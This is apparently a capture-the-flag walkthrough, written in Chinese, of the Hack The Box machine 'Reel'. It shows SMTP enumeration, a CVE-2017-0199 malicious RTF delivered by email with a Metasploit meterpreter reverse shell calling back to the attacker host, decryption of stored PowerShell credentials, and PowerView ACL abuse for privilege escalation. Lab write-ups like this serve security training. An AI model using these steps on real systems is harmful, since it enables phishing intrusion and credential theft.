### 网络连接与SMTP服务器测试

首先，尝试连接到目标IP地址10.10.10.77，并通过SMTP协议进行了一系列命令交互：

```plaintext
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO anything here
250 Hello.
VRFY PI:EMAIL
502 VRFY disallowed.
MAIL From: 
250 OK
RCPT To: 
250 OK
RCPT To: 
550 Unknown user
QUIT
221 goodbye
Connection closed by foreign host.
```

从这次会话中，我们收集到了以下关键信息：
- 目标主机运行着一个SMTP邮件服务器。
- 存在一个电子邮件账户“PI:EMAIL”。
- 某人试图接收.rtf文件。

### 初始入侵点

为了利用已知的信息，我们需要关注CVE-2017-0199漏洞。该漏洞允许攻击者通过恶意的.rtf文件（通常伪装为.doc格式）诱导用户下载并执行.hta文件，从而在受害者的计算机上执行任意代码。此漏洞利用了微软Office软件中的逻辑错误，使得攻击者能够绕过内存缓解措施。

我们可以使用Metasploit框架中的`exploit/windows/fileformat/office_word_hta`模块来生成恶意文件，并托管.hta文件供受害者下载和执行。

#### Metasploit配置示例

```plaintext
msf exploit(windows/fileformat/office_word_hta) > show options
Module options (exploit/windows/fileformat/office_word_hta):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  shell.rtf        yes       The file name.
   SRVHOST   10.10.14.11      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.11      yes       The listen address
   LPORT     1234             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Microsoft Office Word

msf exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.11:1234
[+] shell.rtf stored at /root/.msf4/local/shell.rtf
[*] Using URL: http://10.10.14.11:8080/default.hta
[*] Server started.
```

接下来，使用`swaks`工具将恶意文件发送给目标邮箱“PI:EMAIL”。

```plaintext
swak --to PI:EMAIL --server 10.10.10.77 --attach /root/.msf4/local/shell.rtf
[*] Sending stage (179779 bytes) to 10.10.10.77
[*] Meterpreter session 1 opened (10.10.14.11:1234 -> 10.10.10.77:49359) at 2018-07-21 23:53:43 -0700
msf exploit(windows/fileformat/office_word_hta) > sessions
Active sessions
===============
  Id  Name  Type                     Information      Connection
  --  ----  ----                     -----------      ----------
  1         meterpreter x86/windows  HTB\nico @ REEL  10.10.14.11:1234 -> 10.10.10.77:49359 (10.10.10.77)
```

当受害者打开.rtf文件时，它会触发回调函数下载并执行.hta文件，从而返回一个Meterpreter shell，授予我们对目标主机的访问权限。

### 持久化

在获取到nico用户的Meterpreter会话后，我们在其桌面上发现了一个名为`cred.xml`的文件，其中包含了另一个用户tom的凭证。

```plaintext
meterpreter > dir
Listing: C:\Users\nico\Desktop
==============================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 18:59:16 -0500  cred.xml
100666/rw-rw-rw-  282   fil   2017-10-27 17:42:45 -0500  desktop.ini
100444/r--r--r--  32    fil   2017-10-27 18:40:33 -0500  user.txt
100666/rw-rw-rw-  162   fil   2017-10-27 16:34:38 -0500  ~$iledDeliveryNotification.doc

meterpreter > cat cred.xml
System.Management.Automation.PSCredential
System.Object
System.Management.Automation.PSCredential
HTB\Tom
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692
```

这个XML文档用于存储用户凭证，以便在PowerShell脚本中传递而不必每次都手动输入。加载PowerShell插件并使用相关命令可以读取这些凭证：

```plaintext
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > $tom=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
PS > $tom.GetNetworkCredential().Password
1ts-mag1c!!!
```

使用获得的明文密码，我们可以通过SSH以用户tom的身份登录到目标系统。

### 权限提升

在tom用户的桌面目录中，有一个名为“AD Audit”的文件夹，其中包含BloodHound活动目录审计的结果。审查`acls.csv`文件后发现，用户tom拥有claire帐户的WriteOwner权限，而claire帐户具有backup_admin组的写入权限。

我们可以利用PowerSploit库中的PowerView模块来重置claire的密码，并将其添加到Backup_Admins组中。

#### PowerView操作示例

```powershell
Import-Module 'C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1'
# Set tom as the owner of claire object
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
# Add an entry giving Tom the right to change the password of Claire object
Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
# Change the password of claire
$UserPassword = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword
# Add claire to the Backup_Admins group
$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $UserPassword)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $Cred
```

最后，使用claire帐户通过SSH连接到主机，我们能够访问管理员帐户的桌面，并找到一个名为`BackupScript.ps1`的文件，其中包含了管理员帐户的明文密码。使用该密码，我们可以通过SSH访问管理员帐户并获取最终的root flag。